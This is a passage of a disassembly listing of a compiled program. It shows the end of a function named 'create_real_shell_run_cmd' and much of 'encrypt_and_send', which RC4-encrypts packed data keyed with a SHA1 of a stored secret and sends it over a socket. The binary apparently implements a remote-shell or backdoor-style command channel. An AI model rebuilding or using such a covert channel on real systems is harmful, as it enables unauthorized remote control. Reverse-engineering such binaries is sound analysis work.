  401438:	c7 45 c0 0b 00 00 00 	movl   $0xb,-0x40(%rbp)
  40143f:	8b 45 bc             	mov    -0x44(%rbp),%eax
  401442:	8b 55 a8             	mov    -0x58(%rbp),%edx
  401445:	29 c2                	sub    %eax,%edx
  401447:	89 d0                	mov    %edx,%eax
  401449:	3b 45 c0             	cmp    -0x40(%rbp),%eax
  40144c:	7d 05                	jge    401453 <create_real_shell_run_cmd+0x6b>
  40144e:	e9 d2 00 00 00       	jmpq   401525 <create_real_shell_run_cmd+0x13d>
  401453:	8b 45 c0             	mov    -0x40(%rbp),%eax
  401456:	48 98                	cltq   
  401458:	8b 55 bc             	mov    -0x44(%rbp),%edx
  40145b:	48 63 ca             	movslq %edx,%rcx
  40145e:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  401462:	48 01 d1             	add    %rdx,%rcx
  401465:	48 89 c2             	mov    %rax,%rdx
  401468:	be 24 79 40 00       	mov    $0x407924,%esi
  40146d:	48 89 cf             	mov    %rcx,%rdi
  401470:	e8 eb fa ff ff       	callq  400f60 <memcpy@plt>
  401475:	8b 45 c0             	mov    -0x40(%rbp),%eax
  401478:	01 45 bc             	add    %eax,-0x44(%rbp)
  40147b:	8b 45 bc             	mov    -0x44(%rbp),%eax
  40147e:	48 98                	cltq   
  401480:	48 8d 50 ff          	lea    -0x1(%rax),%rdx
  401484:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  401488:	48 01 d0             	add    %rdx,%rax
  40148b:	0f b6 00             	movzbl (%rax),%eax
  40148e:	3c 2f                	cmp    $0x2f,%al
  401490:	74 16                	je     4014a8 <create_real_shell_run_cmd+0xc0>
  401492:	8b 45 bc             	mov    -0x44(%rbp),%eax
  401495:	8d 50 01             	lea    0x1(%rax),%edx
  401498:	89 55 bc             	mov    %edx,-0x44(%rbp)
  40149b:	48 63 d0             	movslq %eax,%rdx
  40149e:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4014a2:	48 01 d0             	add    %rdx,%rax
  4014a5:	c6 00 2f             	movb   $0x2f,(%rax)
  4014a8:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4014ac:	48 89 c7             	mov    %rax,%rdi
  4014af:	e8 6c f9 ff ff       	callq  400e20 <strlen@plt>
  4014b4:	89 45 c0             	mov    %eax,-0x40(%rbp)
  4014b7:	8b 45 bc             	mov    -0x44(%rbp),%eax
  4014ba:	8b 55 a8             	mov    -0x58(%rbp),%edx
  4014bd:	29 c2                	sub    %eax,%edx
  4014bf:	89 d0                	mov    %edx,%eax
  4014c1:	3b 45 c0             	cmp    -0x40(%rbp),%eax
  4014c4:	7d 02                	jge    4014c8 <create_real_shell_run_cmd+0xe0>
  4014c6:	eb 5d                	jmp    401525 <create_real_shell_run_cmd+0x13d>
  4014c8:	8b 45 c0             	mov    -0x40(%rbp),%eax
  4014cb:	48 63 d0             	movslq %eax,%rdx
  4014ce:	8b 45 bc             	mov    -0x44(%rbp),%eax
  4014d1:	48 63 c8             	movslq %eax,%rcx
  4014d4:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4014d8:	48 01 c1             	add    %rax,%rcx
  4014db:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4014df:	48 89 c6             	mov    %rax,%rsi
  4014e2:	48 89 cf             	mov    %rcx,%rdi
  4014e5:	e8 76 fa ff ff       	callq  400f60 <memcpy@plt>
  4014ea:	8b 45 c0             	mov    -0x40(%rbp),%eax
  4014ed:	01 45 bc             	add    %eax,-0x44(%rbp)
  4014f0:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%rbp)
  4014f7:	8b 45 bc             	mov    -0x44(%rbp),%eax
  4014fa:	8b 55 a8             	mov    -0x58(%rbp),%edx
  4014fd:	29 c2                	sub    %eax,%edx
  4014ff:	89 d0                	mov    %edx,%eax
  401501:	3b 45 c0             	cmp    -0x40(%rbp),%eax
  401504:	7d 02                	jge    401508 <create_real_shell_run_cmd+0x120>
  401506:	eb 1d                	jmp    401525 <create_real_shell_run_cmd+0x13d>
  401508:	8b 45 bc             	mov    -0x44(%rbp),%eax
  40150b:	8d 50 01             	lea    0x1(%rax),%edx
  40150e:	89 55 bc             	mov    %edx,-0x44(%rbp)
  401511:	48 63 d0             	movslq %eax,%rdx
  401514:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  401518:	48 01 d0             	add    %rdx,%rax
  40151b:	c6 00 00             	movb   $0x0,(%rax)
  40151e:	b8 00 00 00 00       	mov    $0x0,%eax
  401523:	eb 5c                	jmp    401581 <create_real_shell_run_cmd+0x199>
  401525:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
  401529:	48 89 c7             	mov    %rax,%rdi
  40152c:	e8 54 17 00 00       	callq  402c85 <pretty_time>
  401531:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
  401535:	48 89 c2             	mov    %rax,%rdx
  401538:	be c1 78 40 00       	mov    $0x4078c1,%esi
  40153d:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  401542:	b8 00 00 00 00       	mov    $0x0,%eax
  401547:	e8 24 f9 ff ff       	callq  400e70 <printf@plt>
  40154c:	be 80 7b 40 00       	mov    $0x407b80,%esi
  401551:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  401556:	b8 00 00 00 00       	mov    $0x0,%eax
  40155b:	e8 10 f9 ff ff       	callq  400e70 <printf@plt>
  401560:	8b 45 bc             	mov    -0x44(%rbp),%eax
  401563:	8b 55 a8             	mov    -0x58(%rbp),%edx
  401566:	29 c2                	sub    %eax,%edx
  401568:	8b 45 c0             	mov    -0x40(%rbp),%eax
  40156b:	89 c6                	mov    %eax,%esi
  40156d:	bf 30 79 40 00       	mov    $0x407930,%edi
  401572:	b8 00 00 00 00       	mov    $0x0,%eax
  401577:	e8 f4 f8 ff ff       	callq  400e70 <printf@plt>
  40157c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401581:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
  401585:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  40158c:	00 00 
  40158e:	74 05                	je     401595 <create_real_shell_run_cmd+0x1ad>
  401590:	e8 9b f8 ff ff       	callq  400e30 <__stack_chk_fail@plt>
  401595:	48 83 c4 68          	add    $0x68,%rsp
  401599:	5b                   	pop    %rbx
  40159a:	5d                   	pop    %rbp
  40159b:	c3                   	retq   

000000000040159c <encrypt_and_send>:
  40159c:	55                   	push   %rbp
  40159d:	48 89 e5             	mov    %rsp,%rbp
  4015a0:	53                   	push   %rbx
  4015a1:	48 81 ec c8 25 00 00 	sub    $0x25c8,%rsp
  4015a8:	48 89 bd 38 da ff ff 	mov    %rdi,-0x25c8(%rbp)
  4015af:	48 89 b5 30 da ff ff 	mov    %rsi,-0x25d0(%rbp)
  4015b6:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4015bd:	00 00 
  4015bf:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4015c3:	31 c0                	xor    %eax,%eax
  4015c5:	c7 85 48 da ff ff 00 	movl   $0x0,-0x25b8(%rbp)
  4015cc:	00 00 00 
  4015cf:	c7 85 4c da ff ff 00 	movl   $0x0,-0x25b4(%rbp)
  4015d6:	00 00 00 
  4015d9:	c7 85 40 da ff ff 00 	movl   $0x0,-0x25c0(%rbp)
  4015e0:	00 00 00 
  4015e3:	e9 11 0b 00 00       	jmpq   4020f9 <encrypt_and_send+0xb5d>
  4015e8:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4015ef:	8b 40 60             	mov    0x60(%rax),%eax
  4015f2:	2b 85 40 da ff ff    	sub    -0x25c0(%rbp),%eax
  4015f8:	ba 00 02 00 00       	mov    $0x200,%edx
  4015fd:	3d 00 02 00 00       	cmp    $0x200,%eax
  401602:	0f 4f c2             	cmovg  %edx,%eax
  401605:	89 85 50 da ff ff    	mov    %eax,-0x25b0(%rbp)
  40160b:	c7 85 44 da ff ff 00 	movl   $0x0,-0x25bc(%rbp)
  401612:	00 00 00 
  401615:	eb 27                	jmp    40163e <encrypt_and_send+0xa2>
  401617:	8b 9d 48 da ff ff    	mov    -0x25b8(%rbp),%ebx
  40161d:	8d 43 01             	lea    0x1(%rbx),%eax
  401620:	89 85 48 da ff ff    	mov    %eax,-0x25b8(%rbp)
  401626:	e8 15 fa ff ff       	callq  401040 <rand@plt>
  40162b:	89 c2                	mov    %eax,%edx
  40162d:	48 63 c3             	movslq %ebx,%rax
  401630:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401637:	83 85 44 da ff ff 01 	addl   $0x1,-0x25bc(%rbp)
  40163e:	83 bd 44 da ff ff 0f 	cmpl   $0xf,-0x25bc(%rbp)
  401645:	7e d0                	jle    401617 <encrypt_and_send+0x7b>
  401647:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  40164d:	8d 50 01             	lea    0x1(%rax),%edx
  401650:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401656:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  40165c:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  40165f:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401666:	48 8b 00             	mov    (%rax),%rax
  401669:	89 c2                	mov    %eax,%edx
  40166b:	48 63 c1             	movslq %ecx,%rax
  40166e:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401675:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  40167b:	8d 50 01             	lea    0x1(%rax),%edx
  40167e:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401684:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  40168a:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  40168d:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401694:	48 8b 00             	mov    (%rax),%rax
  401697:	48 c1 f8 08          	sar    $0x8,%rax
  40169b:	89 c2                	mov    %eax,%edx
  40169d:	48 63 c1             	movslq %ecx,%rax
  4016a0:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4016a7:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  4016ad:	8d 50 01             	lea    0x1(%rax),%edx
  4016b0:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4016b6:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4016bc:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4016bf:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4016c6:	48 8b 00             	mov    (%rax),%rax
  4016c9:	48 c1 f8 10          	sar    $0x10,%rax
  4016cd:	89 c2                	mov    %eax,%edx
  4016cf:	48 63 c1             	movslq %ecx,%rax
  4016d2:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4016d9:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  4016df:	8d 50 01             	lea    0x1(%rax),%edx
  4016e2:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4016e8:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4016ee:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4016f1:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4016f8:	48 8b 00             	mov    (%rax),%rax
  4016fb:	48 c1 f8 18          	sar    $0x18,%rax
  4016ff:	89 c2                	mov    %eax,%edx
  401701:	48 63 c1             	movslq %ecx,%rax
  401704:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  40170b:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401711:	8d 50 01             	lea    0x1(%rax),%edx
  401714:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  40171a:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401720:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401723:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  40172a:	48 8b 40 08          	mov    0x8(%rax),%rax
  40172e:	89 c2                	mov    %eax,%edx
  401730:	48 63 c1             	movslq %ecx,%rax
  401733:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  40173a:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401740:	8d 50 01             	lea    0x1(%rax),%edx
  401743:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401749:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  40174f:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401752:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401759:	48 8b 40 08          	mov    0x8(%rax),%rax
  40175d:	48 c1 f8 08          	sar    $0x8,%rax
  401761:	89 c2                	mov    %eax,%edx
  401763:	48 63 c1             	movslq %ecx,%rax
  401766:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  40176d:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401773:	8d 50 01             	lea    0x1(%rax),%edx
  401776:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  40177c:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401782:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401785:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  40178c:	48 8b 40 08          	mov    0x8(%rax),%rax
  401790:	48 c1 f8 10          	sar    $0x10,%rax
  401794:	89 c2                	mov    %eax,%edx
  401796:	48 63 c1             	movslq %ecx,%rax
  401799:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4017a0:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  4017a6:	8d 50 01             	lea    0x1(%rax),%edx
  4017a9:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4017af:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4017b5:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4017b8:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4017bf:	48 8b 40 08          	mov    0x8(%rax),%rax
  4017c3:	48 c1 f8 18          	sar    $0x18,%rax
  4017c7:	89 c2                	mov    %eax,%edx
  4017c9:	48 63 c1             	movslq %ecx,%rax
  4017cc:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4017d3:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  4017d9:	8d 50 01             	lea    0x1(%rax),%edx
  4017dc:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4017e2:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4017e8:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4017eb:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4017f2:	8b 40 54             	mov    0x54(%rax),%eax
  4017f5:	89 c2                	mov    %eax,%edx
  4017f7:	48 63 c1             	movslq %ecx,%rax
  4017fa:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401801:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401807:	8d 50 01             	lea    0x1(%rax),%edx
  40180a:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401810:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401816:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401819:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401820:	8b 40 54             	mov    0x54(%rax),%eax
  401823:	c1 f8 08             	sar    $0x8,%eax
  401826:	89 c2                	mov    %eax,%edx
  401828:	48 63 c1             	movslq %ecx,%rax
  40182b:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401832:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401838:	8d 50 01             	lea    0x1(%rax),%edx
  40183b:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401841:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401847:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  40184a:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401851:	8b 40 58             	mov    0x58(%rax),%eax
  401854:	89 c2                	mov    %eax,%edx
  401856:	48 63 c1             	movslq %ecx,%rax
  401859:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401860:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401866:	8d 50 01             	lea    0x1(%rax),%edx
  401869:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  40186f:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401875:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401878:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  40187f:	8b 40 58             	mov    0x58(%rax),%eax
  401882:	c1 f8 08             	sar    $0x8,%eax
  401885:	89 c2                	mov    %eax,%edx
  401887:	48 63 c1             	movslq %ecx,%rax
  40188a:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401891:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401897:	8d 50 01             	lea    0x1(%rax),%edx
  40189a:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4018a0:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4018a6:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4018a9:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4018b0:	8b 40 5c             	mov    0x5c(%rax),%eax
  4018b3:	89 c2                	mov    %eax,%edx
  4018b5:	48 63 c1             	movslq %ecx,%rax
  4018b8:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4018bf:	8b 85 50 da ff ff    	mov    -0x25b0(%rbp),%eax
  4018c5:	48 98                	cltq   
  4018c7:	8b 95 40 da ff ff    	mov    -0x25c0(%rbp),%edx
  4018cd:	48 63 d2             	movslq %edx,%rdx
  4018d0:	48 8d 4a 60          	lea    0x60(%rdx),%rcx
  4018d4:	48 8b 95 30 da ff ff 	mov    -0x25d0(%rbp),%rdx
  4018db:	48 01 ca             	add    %rcx,%rdx
  4018de:	48 8d 72 04          	lea    0x4(%rdx),%rsi
  4018e2:	8b 95 4c da ff ff    	mov    -0x25b4(%rbp),%edx
  4018e8:	8b 8d 48 da ff ff    	mov    -0x25b8(%rbp),%ecx
  4018ee:	01 ca                	add    %ecx,%edx
  4018f0:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  4018f7:	48 63 d2             	movslq %edx,%rdx
  4018fa:	48 01 d1             	add    %rdx,%rcx
  4018fd:	48 89 c2             	mov    %rax,%rdx
  401900:	48 89 cf             	mov    %rcx,%rdi
  401903:	e8 58 f6 ff ff       	callq  400f60 <memcpy@plt>
  401908:	8b 85 50 da ff ff    	mov    -0x25b0(%rbp),%eax
  40190e:	01 85 4c da ff ff    	add    %eax,-0x25b4(%rbp)
  401914:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  40191b:	48 89 c7             	mov    %rax,%rdi
  40191e:	e8 f5 16 00 00       	callq  403018 <sha1_starts>
  401923:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401929:	48 63 d0             	movslq %eax,%rdx
  40192c:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  401933:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401939:	48 98                	cltq   
  40193b:	48 01 c1             	add    %rax,%rcx
  40193e:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401945:	48 89 ce             	mov    %rcx,%rsi
  401948:	48 89 c7             	mov    %rax,%rdi
  40194b:	e8 9e 58 00 00       	callq  4071ee <sha1_update>
  401950:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401956:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  40195c:	01 d0                	add    %edx,%eax
  40195e:	48 8d 95 40 df ff ff 	lea    -0x20c0(%rbp),%rdx
  401965:	48 98                	cltq   
  401967:	48 01 c2             	add    %rax,%rdx
  40196a:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401971:	48 89 d6             	mov    %rdx,%rsi
  401974:	48 89 c7             	mov    %rax,%rdi
  401977:	e8 b0 59 00 00       	callq  40732c <sha1_finish>
  40197c:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401982:	48 63 d0             	movslq %eax,%rdx
  401985:	48 8b 0d 04 78 20 00 	mov    0x207804(%rip),%rcx        # 609190 <secret>
  40198c:	48 8d 85 a0 de ff ff 	lea    -0x2160(%rbp),%rax
  401993:	48 89 ce             	mov    %rcx,%rsi
  401996:	48 89 c7             	mov    %rax,%rdi
  401999:	e8 c2 f5 ff ff       	callq  400f60 <memcpy@plt>
  40199e:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  4019a4:	48 63 d0             	movslq %eax,%rdx
  4019a7:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  4019ad:	48 98                	cltq   
  4019af:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  4019b6:	48 01 c1             	add    %rax,%rcx
  4019b9:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
  4019c0:	48 89 c6             	mov    %rax,%rsi
  4019c3:	48 89 cf             	mov    %rcx,%rdi
  4019c6:	e8 95 f5 ff ff       	callq  400f60 <memcpy@plt>
  4019cb:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  4019d2:	48 89 c7             	mov    %rax,%rdi
  4019d5:	e8 3e 16 00 00       	callq  403018 <sha1_starts>
  4019da:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  4019e1:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  4019e8:	ba 20 00 00 00       	mov    $0x20,%edx
  4019ed:	48 89 ce             	mov    %rcx,%rsi
  4019f0:	48 89 c7             	mov    %rax,%rdi
  4019f3:	e8 f6 57 00 00       	callq  4071ee <sha1_update>
  4019f8:	48 8d 95 a0 de ff ff 	lea    -0x2160(%rbp),%rdx
  4019ff:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401a06:	48 89 d6             	mov    %rdx,%rsi
  401a09:	48 89 c7             	mov    %rax,%rdi
  401a0c:	e8 1b 59 00 00       	callq  40732c <sha1_finish>
  401a11:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  401a18:	48 8d 85 60 da ff ff 	lea    -0x25a0(%rbp),%rax
  401a1f:	ba 14 00 00 00       	mov    $0x14,%edx
  401a24:	48 89 ce             	mov    %rcx,%rsi
  401a27:	48 89 c7             	mov    %rax,%rdi
  401a2a:	e8 ae 5b 00 00       	callq  4075dd <rc4_setup>
  401a2f:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401a35:	8d 50 14             	lea    0x14(%rax),%edx
  401a38:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401a3e:	48 98                	cltq   
  401a40:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  401a47:	48 01 c1             	add    %rax,%rcx
  401a4a:	48 8d 85 60 da ff ff 	lea    -0x25a0(%rbp),%rax
  401a51:	48 89 ce             	mov    %rcx,%rsi
  401a54:	48 89 c7             	mov    %rax,%rdi
  401a57:	e8 a0 5c 00 00       	callq  4076fc <rc4_crypt>
  401a5c:	48 8b 85 38 da ff ff 	mov    -0x25c8(%rbp),%rax
  401a63:	48 8d 48 04          	lea    0x4(%rax),%rcx
  401a67:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401a6d:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401a73:	01 d0                	add    %edx,%eax
  401a75:	83 c0 14             	add    $0x14,%eax
  401a78:	48 63 d0             	movslq %eax,%rdx
  401a7b:	48 8b 85 38 da ff ff 	mov    -0x25c8(%rbp),%rax
  401a82:	8b 00                	mov    (%rax),%eax
  401a84:	48 8d b5 40 df ff ff 	lea    -0x20c0(%rbp),%rsi
  401a8b:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  401a91:	49 89 c8             	mov    %rcx,%r8
  401a94:	b9 00 00 00 00       	mov    $0x0,%ecx
  401a99:	89 c7                	mov    %eax,%edi
  401a9b:	e8 30 f4 ff ff       	callq  400ed0 <sendto@plt>
  401aa0:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401aa6:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401aac:	01 d0                	add    %edx,%eax
  401aae:	83 c0 14             	add    $0x14,%eax
  401ab1:	89 85 54 da ff ff    	mov    %eax,-0x25ac(%rbp)
  401ab7:	bf 7b 79 40 00       	mov    $0x40797b,%edi
  401abc:	e8 2f f3 ff ff       	callq  400df0 <puts@plt>
  401ac1:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401ac8:	48 8b 00             	mov    (%rax),%rax
  401acb:	89 c6                	mov    %eax,%esi
  401acd:	bf 8c 79 40 00       	mov    $0x40798c,%edi
  401ad2:	b8 00 00 00 00       	mov    $0x0,%eax
  401ad7:	e8 94 f3 ff ff       	callq  400e70 <printf@plt>
  401adc:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401ae3:	48 8b 40 08          	mov    0x8(%rax),%rax
  401ae7:	89 c6                	mov    %eax,%esi
  401ae9:	bf 9b 79 40 00       	mov    $0x40799b,%edi
  401aee:	b8 00 00 00 00       	mov    $0x0,%eax
  401af3:	e8 78 f3 ff ff       	callq  400e70 <printf@plt>
  401af8:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401aff:	8b 40 54             	mov    0x54(%rax),%eax
  401b02:	89 c6                	mov    %eax,%esi
  401b04:	bf aa 79 40 00       	mov    $0x4079aa,%edi
  401b09:	b8 00 00 00 00       	mov    $0x0,%eax
  401b0e:	e8 5d f3 ff ff       	callq  400e70 <printf@plt>
  401b13:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401b1a:	8b 40 58             	mov    0x58(%rax),%eax
  401b1d:	89 c6                	mov    %eax,%esi
  401b1f:	bf b9 79 40 00       	mov    $0x4079b9,%edi
  401b24:	b8 00 00 00 00       	mov    $0x0,%eax
  401b29:	e8 42 f3 ff ff       	callq  400e70 <printf@plt>
  401b2e:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401b35:	8b 40 5c             	mov    0x5c(%rax),%eax
  401b38:	89 c6                	mov    %eax,%esi
  401b3a:	bf c8 79 40 00       	mov    $0x4079c8,%edi
  401b3f:	b8 00 00 00 00       	mov    $0x0,%eax
  401b44:	e8 27 f3 ff ff       	callq  400e70 <printf@plt>
  401b49:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401b50:	8b 40 60             	mov    0x60(%rax),%eax
  401b53:	89 c6                	mov    %eax,%esi
  401b55:	bf d7 79 40 00       	mov    $0x4079d7,%edi
  401b5a:	b8 00 00 00 00       	mov    $0x0,%eax
  401b5f:	e8 0c f3 ff ff       	callq  400e70 <printf@plt>
  401b64:	bf e6 79 40 00       	mov    $0x4079e6,%edi
  401b69:	e8 82 f2 ff ff       	callq  400df0 <puts@plt>
  401b6e:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  401b74:	48 63 d0             	movslq %eax,%rdx
  401b77:	48 8b 85 58 da ff ff 	mov    -0x25a8(%rbp),%rax
  401b7e:	be 00 00 00 00       	mov    $0x0,%esi
  401b83:	48 89 c7             	mov    %rax,%rdi
  401b86:	e8 ff 0f 00 00       	callq  402b8a <__print_output>
  401b8b:	bf f2 79 40 00       	mov    $0x4079f2,%edi
  401b90:	e8 5b f2 ff ff       	callq  400df0 <puts@plt>
  401b95:	8b 85 54 da ff ff    	mov    -0x25ac(%rbp),%eax
  401b9b:	48 63 d0             	movslq %eax,%rdx
  401b9e:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
  401ba5:	be 00 00 00 00       	mov    $0x0,%esi
  401baa:	48 89 c7             	mov    %rax,%rdi
  401bad:	e8 d8 0f 00 00       	callq  402b8a <__print_output>
  401bb2:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401bb8:	48 63 d0             	movslq %eax,%rdx
  401bbb:	48 8b 0d ce 75 20 00 	mov    0x2075ce(%rip),%rcx        # 609190 <secret>
  401bc2:	48 8d 85 a0 de ff ff 	lea    -0x2160(%rbp),%rax
  401bc9:	48 89 ce             	mov    %rcx,%rsi
  401bcc:	48 89 c7             	mov    %rax,%rdi
  401bcf:	e8 8c f3 ff ff       	callq  400f60 <memcpy@plt>
  401bd4:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401bda:	48 63 d0             	movslq %eax,%rdx
  401bdd:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401be3:	48 98                	cltq   
  401be5:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  401bec:	48 01 c1             	add    %rax,%rcx
  401bef:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
